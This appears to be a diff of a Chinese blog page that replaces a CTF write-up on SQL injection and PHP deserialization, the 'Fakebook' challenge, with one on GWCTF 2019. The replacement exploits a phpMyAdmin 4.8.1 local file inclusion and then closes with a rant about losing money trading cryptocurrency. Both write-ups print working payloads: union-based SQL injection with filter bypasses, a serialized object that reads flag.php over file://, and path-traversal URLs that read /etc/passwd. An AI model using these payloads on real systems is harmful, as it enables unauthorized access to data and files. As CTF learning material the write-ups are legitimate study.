@@ -15,24 +15,23 @@
 <link rel="stylesheet" href="/css/tags.css" media="all">
 
 
-<meta name="description" content="考验sql注入和反序列化">
+<meta name="description" content="今天玩币亏了2300，让我在回本的路上又雪上加霜。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="网鼎杯CTF_Fakebook">
-<meta property="og:url" content="https://www.tu3k.cn/2021/04/16/fakebook-ctf/index.html">
+<meta property="og:title" content="GWCTF 2019_我有一个数据库">
+<meta property="og:url" content="https://www.tu3k.cn/2021/04/21/i_have_a_data/index.html">
 <meta property="og:site_name">
-<meta property="og:description" content="考验sql注入和反序列化">
+<meta property="og:description" content="今天玩币亏了2300，让我在回本的路上又雪上加霜。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/1.png">
-<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/5.png">
-<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/2.png">
-<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/3.png">
-<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/4.png">
-<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/6.png">
-<meta property="article:published_time" content="2021-04-16T11:54:39.000Z">
-<meta property="article:modified_time" content="2021-04-17T03:23:52.524Z">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/26.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/27.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/28.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/29.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/1.jpg">
+<meta property="article:published_time" content="2021-04-21T02:05:51.000Z">
+<meta property="article:modified_time" content="2021-04-23T12:36:33.199Z">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://www.tu3k.cn/images/php_web_ctf2/1.png">
+<meta name="twitter:image" content="http://www.tu3k.cn/images/php_web_ctf2/26.png">
 
 
     <link rel="icon" href="/images/favicon.ico">
@@ -66,7 +65,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>网鼎杯CTF_Fakebook | Tu3k's Blog</title>
+<title>GWCTF 2019_我有一个数据库 | Tu3k's Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -275,11 +274,11 @@
     </div>
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
-      <div class="body-wrap"><article id="post-fakebook-ctf" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-i_have_a_data" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/04/16/fakebook-ctf/" class="article-date">
-      <time datetime="2021-04-16T11:54:39.000Z" itemprop="datePublished">2021-04-16</time>
+      <a href="/2021/04/21/i_have_a_data/" class="article-date">
+      <time datetime="2021-04-21T02:05:51.000Z" itemprop="datePublished">2021-04-21</time>
 </a>
 
 
@@ -294,7 +293,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      网鼎杯CTF_Fakebook
+      GWCTF 2019_我有一个数据库
     </h1>
   
 
@@ -315,23 +314,19 @@
 <div class="article-entry" itemprop="articleBody">
     
         
-        <p>考验sql注入和反序列化</p>
+        <p>今天玩币亏了2300，让我在回本的路上又雪上加霜。</p>
 <a id="more"></a>
-<p>打开页面，先注册账号<br><img src="http://www.tu3k.cn/images/php_web_ctf2/1.png" alt="fakebook_ctf" title="fakebook"><br>在个人中心发现iframe引用了我博客地址，标准的ssrf呀，准备使用伪协议来获取网站根目录的flag.php，前面报错已经出来网址路径了<br><code>file:///var/www/html/flag.php</code>，但是有正则匹配必须是网址格式，歇菜。<br>发现个人信息链接：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;view.php?no&#x3D;1</span><br></pre></td></tr></table></figure>
-<p>单引号报错，数字型注入，联合查询被拦截提示no hack~<br><img src="http://www.tu3k.cn/images/php_web_ctf2/5.png" alt="fakebook_ctf" title="fakebook"><br>注释符绕过<br>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no&#x3D;1 and 1&#x3D;2 union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
-<p>表名：users<br>另外发现反序列化函数的报错<br><img src="http://www.tu3k.cn/images/php_web_ctf2/2.png" alt="fakebook_ctf" title="fakebook"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no&#x3D;1 and 1&#x3D;2 union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;&quot;users&quot;</span><br></pre></td></tr></table></figure>
-<p>本来users是用hex编码，但提示no hack~，双引号可以绕过<br>字段：no,username,passwd,data<br><img src="http://www.tu3k.cn/images/php_web_ctf2/3.png" alt="fakebook_ctf" title="fakebook"><br>没有发现博客字段，查看data，发现是序列化后的个人信息,带博客地址<br><img src="http://www.tu3k.cn/images/php_web_ctf2/4.png" alt="fakebook_ctf" title="fakebook"><br>也就是说只需要将blog地址改为伪协议读取flag的地址，然后传入对应的显位中进行联合查询，那么服务器会临时执行我们传入显位的代码，从而拿到flag。<br>（一开始用了load_file去查看flag.php，不行，hex编码也被拦截。）</p>
-<p>但是还不知道他的序列化规则和类的属性<br>看了下robots，发现程序文件，下载之…<br>拿到规则后，主要就三个功能：<br>1 初始化用户名等信息<br>2 请求<br>3 验证传来的博客地址是否准确。<br>构造exp</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new UserInfo();</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br></pre></td></tr></table></figure>
-<p>得到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
-<p>因为显位有4个，data也在第四位，所以直接联合查询让数据库临时查询我们传入的内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no&#x3D;1 and 1&#x3D;2 union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>
-<p>查看源代码发现iframe加载进来的flag.php的base64编码<br><img src="http://www.tu3k.cn/images/php_web_ctf2/6.png" alt="fakebook_ctf" title="fakebook"><br>解密拿到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag &#x3D; &quot;flag&#123;02078454-f9dc-46bd-9c65-ed390820d0ab&#125;&quot;;</span><br><span class="line">exit(0);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="Phpmyadmin本地包含漏洞"><a href="#Phpmyadmin本地包含漏洞" class="headerlink" title="Phpmyadmin本地包含漏洞"></a>Phpmyadmin本地包含漏洞</h3><p>页面提示，有个空数据库，通过dirsearch探测发现phpmyadmin未授权<br><img src="http://www.tu3k.cn/images/php_web_ctf2/26.png" alt="phpmyadmin" title="phpmyadmin"><br>尝试拿shell，没有路径泄露没有什么信息的很难<br><img src="http://www.tu3k.cn/images/php_web_ctf2/27.png" alt="phpmyadmin" title="phpmyadmin"></p>
+<p>该phpmyadmin版本4.8.1，尝试本地包含漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;phpmyadmin&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p><img src="http://www.tu3k.cn/images/php_web_ctf2/28.png" alt="phpmyadmin" title="phpmyadmin"></p>
+<p>尝试获取根目录flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;phpmyadmin&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>
+<p><img src="http://www.tu3k.cn/images/php_web_ctf2/29.png" alt="phpmyadmin" title="phpmyadmin"></p>
+<h3 id="不要玩币"><a href="#不要玩币" class="headerlink" title="不要玩币"></a>不要玩币</h3><p>我买什么币什么币就跌，做空他涨，做多他跌，本金1w还剩10块，买包烟抽算了。</p>
+<p>另外不要听所谓的教学 收费玩币，如果他们真的能看懂币圈市场趋势何必收你那几千块钱，早就闷声发大财了。<br>还不如信那些免费带你玩的，起码你亏钱挣钱都跟他没关系，那才是真带你玩的。</p>
+<p>最后，没有99%的把握不要开合约。不要开！<br><img src="http://www.tu3k.cn/images/php_web_ctf2/1.jpg" alt="phpmyadmin" title="phpmyadmin"></p>
+
     
 </div>
     
@@ -339,13 +334,13 @@
   
     
     <div class="copyright">
-        <p><span>Title:</span><a href="/2021/04/16/fakebook-ctf/">网鼎杯CTF_Fakebook</a></p>
+        <p><span>Title:</span><a href="/2021/04/21/i_have_a_data/">GWCTF 2019_我有一个数据库</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
-        <p><span>Created:</span>2021-04-16, 19:54:39</p>
-        <p><span>Updated:</span>2021-04-17, 11:23:52</p>
+        <p><span>Created:</span>2021-04-21, 10:05:51</p>
+        <p><span>Updated:</span>2021-04-23, 20:36:33</p>
         <p>
-            <span>Full URL:</span><a class="post-url" href="/2021/04/16/fakebook-ctf/" title="网鼎杯CTF_Fakebook">https://www.tu3k.cn/2021/04/16/fakebook-ctf/</a>
-            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/04/16/fakebook-ctf/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/2021/04/21/i_have_a_data/" title="GWCTF 2019_我有一个数据库">https://www.tu3k.cn/2021/04/21/i_have_a_data/</a>
+            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/04/21/i_have_a_data/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -358,15 +353,15 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2021/04/17/AreUSerialz-ctf/">
-                    网鼎杯_AreUSerialz
+                <a href="/2021/04/22/taowa/">
+                    MRCTF2020_套娃
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2021/04/16/hardsql/">
-                    极客大挑战HardSql
+                <a href="/2021/04/20/badday/">
+                    BSidesCF 2020_Had a bad day
                 </a>
             </div>
         
@@ -378,7 +373,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-            
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Phpmyadmin%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">Phpmyadmin本地包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E8%A6%81%E7%8E%A9%E5%B8%81"><span class="toc-number">2.</span> <span class="toc-text">不要玩币</span></a></li></ol>
         
     </div>
     <style>
@@ -414,7 +409,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"网鼎杯CTF_Fakebook　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"GWCTF 2019_我有一个数据库　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -434,7 +429,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2021/04/17/AreUSerialz-ctf/" title="Pre: 网鼎杯_AreUSerialz">
+            <a href="/2021/04/22/taowa/" title="Pre: MRCTF2020_套娃">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -442,7 +437,7 @@
         <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2021/04/16/hardsql/" title="Next: 极客大挑战HardSql">
+            <a href="/2021/04/20/badday/" title="Next: BSidesCF 2020_Had a bad day">
                 <i class="fa fa-angle-right"></i>
             </a>
         
